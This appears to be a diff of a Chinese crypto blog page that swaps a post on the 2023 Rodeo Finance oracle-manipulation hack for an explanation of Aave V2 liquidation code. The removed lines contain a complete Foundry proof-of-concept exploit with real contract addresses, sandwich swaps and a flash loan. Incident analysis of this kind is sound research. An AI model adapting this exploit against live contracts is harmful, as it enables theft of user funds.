@@ -4,9 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="20230711 RodeoFinance, Blog">
-    <meta name="description" content="攻击介绍2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。
-攻击分析攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与">
+    <meta name="keywords" content="Aave V2分析(三), Blog">
+    <meta name="description" content="Aave V2分析(三)Liquidation在defi中，当债务人的抵押资产代币可能不足以抵扣债务时，任何人都可以参与清算。清算的过程是通过repay部分债务，获得部分抵押资产。
+  function liquidationCall(
+ ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +19,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>20230711 RodeoFinance | Blog</title>
+    <title>Aave V2分析(三) | Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -283,12 +284,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">20230711 RodeoFinance</h1>
+                    <h1 class="description center-align post-title">Aave V2分析(三)</h1>
                 </div>
             </div>
         </div>
@@ -324,21 +325,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-11-03
+                    2024-03-24
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-01-17
+                    2024-03-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    680
+                    802
                 </div>
                 
 
@@ -365,159 +366,184 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。</p>
-<h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与 unshETH 的准备金比率来检查价格。同时攻击者能够通过具有未配置策略地址的 earn 函数强制平台将 USDC 兑换为 unshETH。由于价格预言机存在缺陷，滑点控制无法生效。(具体可见Meth为0x7b37c42b的交易)。</p>
-<pre><code>function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes calldata dat)
-  external
-  loop
-  returns (uint256)
-{
-  if (status &lt; S_LIVE) revert WrongStatus();
-  if (!pools[pol]) revert InvalidPool();
-  if (strategies[str] == address(0)) revert InvalidStrategy();
-  uint256 id = nextPosition++;
-  Position storage p = positions[id];
-  p.owner = usr;
-  p.pool = pol;
-  p.strategy = str;
-  p.outset = block.timestamp;
-  pullTo(IERC20(IPool(p.pool).asset()), msg.sender, address(actor), uint256(amt));
-  (int256 bas, int256 sha, int256 bar) = actor.edit(id, int256(amt), int256(bor), dat);
-  p.amount = uint256(bas);
-  p.shares = uint256(sha);
-  p.borrow = uint256(bar);
-  emit Edit(id, int256(amt), int256(bor), sha, bar);
-  return id;
-}
+                <h1 id="Aave-V2分析-三"><a href="#Aave-V2分析-三" class="headerlink" title="Aave V2分析(三)"></a>Aave V2分析(三)</h1><h2 id="Liquidation"><a href="#Liquidation" class="headerlink" title="Liquidation"></a>Liquidation</h2><p>在defi中，当债务人的抵押资产代币可能不足以抵扣债务时，任何人都可以参与清算。清算的过程是通过repay部分债务，获得部分抵押资产。</p>
+<pre class=" language-solidity"><code class="language-solidity">  function liquidationCall(
+    address collateralAsset,
+    address debtAsset,
+    address user,
+    uint256 debtToCover,
+    bool receiveAToken
+  ) external override whenNotPaused {
+    address collateralManager = _addressesProvider.getLendingPoolCollateralManager();
+
+    //solium-disable-next-line
+    (bool success, bytes memory result) =
+      collateralManager.delegatecall(
+        abi.encodeWithSignature(
+          'liquidationCall(address,address,address,uint256,bool)',
+          collateralAsset,
+          debtAsset,
+          user,
+          debtToCover,
+          receiveAToken
+        )
+      );
+
+    require(success, Errors.LP_LIQUIDATION_CALL_FAILED);
+
+    (uint256 returnCode, string memory returnMessage) = abi.decode(result, (uint256, string));
+
+    require(returnCode == 0, string(abi.encodePacked(returnMessage)));
+  }
 </code></pre>
-<p>其次unshETH价格使用了TWAP，是计算45分钟内的最后4次更新价格实例的平均值，导致攻击者可以通过”三明治”来控制价格，从而套利。</p>
-<pre><code>function latestAnswer() external view returns (int256) {
-  require(block.timestamp &lt; lastTimestamp + (updateInterval * 2), "stale price");
-  int256 price = (prices[0] + prices[1] + prices[2] + prices[3]) / 4;
-  return price;
-}
+<p>这是清算的入口函数，在函数中首先拿到质押品管理者的地址，然后调用管理者的liquidationCall函数进行实际的清算处理。接下来让我们分析它的具体执行过程。</p>
+<pre class=" language-solidity"><code class="language-solidity">  function liquidationCall(
+    address collateralAsset,
+    address debtAsset,
+    address user,
+    uint256 debtToCover,
+    bool receiveAToken
+  ) external override returns (uint256, string memory) {
+   // ......
+  }
 </code></pre>
-<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.10;
+<p>首先拿到清算债务要用到的数据，包括质押品储备池，债务储备池，用户配置，健康因子。</p>
+<pre class=" language-solidity"><code class="language-solidity">    DataTypes.ReserveData storage collateralReserve = _reserves[collateralAsset];
+    DataTypes.ReserveData storage debtReserve = _reserves[debtAsset];
+    DataTypes.UserConfigurationMap storage userConfig = _usersConfig[user];
 
-import "forge-std/Test.sol";
-import "./interface.sol";
+    LiquidationCallLocalVars memory vars;
 
-// Vulnerable Contract : 0xf3721d8a2c051643e06bf2646762522fa66100da
-// Attack Tx : 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a
+    (, , , , vars.healthFactor) = GenericLogic.calculateUserAccountData(
+      user,
+      _reserves,
+      userConfig,
+      _reservesList,
+      _reservesCount,
+      _addressesProvider.getPriceOracle()
+    );
+</code></pre>
+<p>然后获取被清算用户的债务信息，包括固定债务和流动债务。</p>
+<pre class=" language-solidity"><code class="language-solidity">(vars.userStableDebt, vars.userVariableDebt) = Helpers.getUserCurrentDebt(user, debtReserve);
+</code></pre>
+<p>然后验证清算是否合格，包括用户的Health factor是否低于清算所需阈值，用户的债务是否为0，用户的资产是否设置为可抵押</p>
+<pre class=" language-solidity"><code class="language-solidity">   (vars.errorCode, vars.errorMsg) = ValidationLogic.validateLiquidationCall(
+      collateralReserve,
+      debtReserve,
+      userConfig,
+      vars.healthFactor,
+      vars.userStableDebt,
+      vars.userVariableDebt
+    );
+</code></pre>
+<p>然后获得被清算人可清算的债务的上限。</p>
+<pre class=" language-solidity"><code class="language-solidity">    vars.collateralAtoken = IAToken(collateralReserve.aTokenAddress);
 
+    vars.userCollateralBalance = vars.collateralAtoken.balanceOf(user);
 
-interface IInvestor {
-    function earn(
-        address usr,
-        address pol,
-        uint256 str,
-        uint256 amt,
-        uint256 bor,
-        bytes memory dat
-    ) external returns (uint256);
-}
+    vars.maxLiquidatableDebt = vars.userStableDebt.add(vars.userVariableDebt).percentMul(
+      LIQUIDATION_CLOSE_FACTOR_PERCENT
+    );
 
-interface ICamelotRouter {
-    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        address referrer,
-        uint256 deadline
-    ) external;
-}
-
-interface ISwapRouter {
-    struct ExactInputParams {
-        bytes path;
-        address recipient;
-        uint256 deadline;
-        uint256 amountIn;
-        uint256 amountOutMinimum;
+    vars.actualDebtToLiquidate = debtToCover > vars.maxLiquidatableDebt
+      ? vars.maxLiquidatableDebt
+      : debtToCover;
+</code></pre>
+<p>然后计算实际可清算债务。(因为被清算人的质押品可能无法完全覆盖债务)</p>
+<pre class=" language-solidity"><code class="language-solidity">    (
+      vars.maxCollateralToLiquidate,
+      vars.debtAmountNeeded
+    ) = _calculateAvailableCollateralToLiquidate(
+      collateralReserve,
+      debtReserve,
+      collateralAsset,
+      debtAsset,
+      vars.actualDebtToLiquidate,
+      vars.userCollateralBalance
+    );
+    if (vars.debtAmountNeeded < vars.actualDebtToLiquidate) {
+      vars.actualDebtToLiquidate = vars.debtAmountNeeded;
     }
-
-    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
-}
-
-contract RodeoTest is Test {
-    IERC20 unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);
-    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
-    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
-    IInvestor Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
-    ICamelotRouter Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
-    ISwapRouter SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
-    function setUp() public {
-        cheats.createSelectFork("arbitrum", 110_043_452);
-        cheats.label(address(unshETH), "unsETH");
-        cheats.label(address(WETH), "WETH");
-        cheats.label(address(USDC), "USDC");
-        cheats.label(address(Investor), "Investor");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(SwapRouter), "SwapRouter");
-        cheats.label(address(Vault), "Vault");
-    }
-
-    function testExploit() public {
-
-        deal(address(unshETH), address(this), 47_294_222_088_336_002_957);
-        unshETH.approve(address(Router), type(uint256).max);
-        WETH.approve(address(Router), type(uint256).max);
-        USDC.approve(address(SwapRouter), type(uint256).max);
-
-        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));
-       
-        swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));
-        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));
-
-        swapUSDCToWETH();
-        takeWETHFlashloanOnBalancer();
-
-    }
-
-    function receiveFlashLoan(
-        address[] memory tokens,
-        uint256[] memory amounts,
-        uint256[] memory feeAmounts,
-        bytes memory userData
-    ) external {
-        
-        swapTokens(amounts[0], address(WETH), address(USDC));
-        
-        swapUSDCToWETH();
-        
-        WETH.transfer(address(Vault), amounts[0]);
-    }
-
-    function swapTokens(uint256 amountIn, address fromToken, address toToken) internal {
-        address[] memory path = new address[](2);
-        path[0] = fromToken;
-        path[1] = toToken;
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn, 0, path, address(this), address(0), block.timestamp + 100
+</code></pre>
+<p>函数_calculateAvailableCollateralToLiquidate逻辑很简单，就是根据以下公式换算代币数量：</p>
+<p>debt token price * debt amount * liqudation bonus= collateral token price* collateral token amount</p>
+<p>然后判断清算者是否想要抵押的代币，如果清算者想要抵押的代币而非aToken，那么AAVE检查整个抵押代币池是否足够应对清算要求。</p>
+<pre class=" language-solidity"><code class="language-solidity">    if (!receiveAToken) {
+      uint256 currentAvailableCollateral =
+        IERC20(collateralAsset).balanceOf(address(vars.collateralAtoken));
+      if (currentAvailableCollateral < vars.maxCollateralToLiquidate) {
+        return (
+          uint256(Errors.CollateralManagerErrors.NOT_ENOUGH_LIQUIDITY),
+          Errors.LPCM_NOT_ENOUGH_LIQUIDITY_TO_LIQUIDATE
         );
+      }
     }
+</code></pre>
+<p>然后更新复利索引，因为清算改变了债务数量，也因此改变了浮动利率。</p>
+<pre class=" language-solidity"><code class="language-solidity">debtReserve.updateState();
+</code></pre>
+<p>先清算浮动利率债务，再清算固定利率债务，直到完成本次清算所需数量。</p>
+<pre class=" language-solidity"><code class="language-solidity">  if (vars.userVariableDebt >= vars.actualDebtToLiquidate) {
+      IVariableDebtToken(debtReserve.variableDebtTokenAddress).burn(
+        user,
+        vars.actualDebtToLiquidate,
+        debtReserve.variableBorrowIndex
+      );
+    } else {
+      // If the user doesn't have variable debt, no need to try to burn variable debt tokens
+      if (vars.userVariableDebt > 0) {
+        IVariableDebtToken(debtReserve.variableDebtTokenAddress).burn(
+          user,
+          vars.userVariableDebt,
+          debtReserve.variableBorrowIndex
+        );
+      }
+      IStableDebtToken(debtReserve.stableDebtTokenAddress).burn(
+        user,
+        vars.actualDebtToLiquidate.sub(vars.userVariableDebt)
+      );
+    }
+</code></pre>
+<p>然后更新利率。</p>
+<pre class=" language-solidity"><code class="language-solidity">    debtReserve.updateInterestRates(
+      debtAsset,
+      debtReserve.aTokenAddress,
+      vars.actualDebtToLiquidate,
+      0
+    );
+</code></pre>
+<p>然后区分是发送aToken还是Underlyaing asset给清算者。</p>
+<pre class=" language-solidity"><code class="language-solidity">    if (receiveAToken) {
+      vars.liquidatorPreviousATokenBalance = IERC20(vars.collateralAtoken).balanceOf(msg.sender);
+      vars.collateralAtoken.transferOnLiquidation(user, msg.sender, vars.maxCollateralToLiquidate);
 
-    function swapUSDCToWETH() internal {
-        bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));
-        ISwapRouter.ExactInputParams memory params =
-            ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);
-        SwapRouter.exactInput(params);
+      if (vars.liquidatorPreviousATokenBalance == 0) {
+        DataTypes.UserConfigurationMap storage liquidatorConfig = _usersConfig[msg.sender];
+        liquidatorConfig.setUsingAsCollateral(collateralReserve.id, true);
+        emit ReserveUsedAsCollateralEnabled(collateralAsset, msg.sender);
+      }
+    } else {
+      collateralReserve.updateState();
+      collateralReserve.updateInterestRates(
+        collateralAsset,
+        address(vars.collateralAtoken),
+        0,
+        vars.maxCollateralToLiquidate
+      );
+      vars.collateralAtoken.burn(
+        user,
+        msg.sender,
+        vars.maxCollateralToLiquidate,
+        collateralReserve.liquidityIndex
+      );
     }
-
-    function takeWETHFlashloanOnBalancer() internal {
-        address[] memory tokens = new address[](1);
-        tokens[0] = address(WETH);
-        uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 30e18;
-        Vault.flashLoan(address(this), tokens, amounts, bytes(""));
-    }
-}
+</code></pre>
+<p>清算者将偿还的代币转给AAVE</p>
+<pre class=" language-solidity"><code class="language-solidity">    IERC20(debtAsset).safeTransferFrom(
+      msg.sender,
+      debtReserve.aTokenAddress,
+      vars.actualDebtToLiquidate
+    );
 </code></pre>
 
                 
@@ -545,7 +571,7 @@ contract RodeoTest is Test {
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://willcking.github.io/2023/11/03/20230711-RodeoFinance/">https://willcking.github.io/2023/11/03/20230711-RodeoFinance/</a>
+                    <a href="https://willcking.github.io/2024/03/24/Aave-V2%E5%88%86%E6%9E%90(%E4%B8%89)/">https://willcking.github.io/2024/03/24/Aave-V2%E5%88%86%E6%9E%90(%E4%B8%89)/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -659,54 +685,18 @@ contract RodeoTest is Test {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2024/01/17/ERC721A%E8%A7%A3%E6%9E%90/">
+                <a href="/2024/03/24/Aave-V2%E5%88%86%E6%9E%90(%E4%B8%89)/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="ERC721A解析">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="Aave V2分析(三)">
                         
-                        <span class="card-title">ERC721A解析</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-01-17
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            潇南笑笑生
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/10/26/20230717-NewFi/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="20230717 NewFi">
-                        
-                        <span class="card-title">20230717 NewFi</span>
+                        <span class="card-title">Aave V2分析(三)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -717,7 +707,45 @@ contract RodeoTest is Test {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-10-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            潇南笑笑生
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2024/03/21/Aave%20V2%E5%88%86%E6%9E%90(%E4%BA%8C)/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Aave V2分析(二)">
+                        
+                        <span class="card-title">Aave V2分析(二)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-21
                             </span>
                         <span class="publish-author">
                             
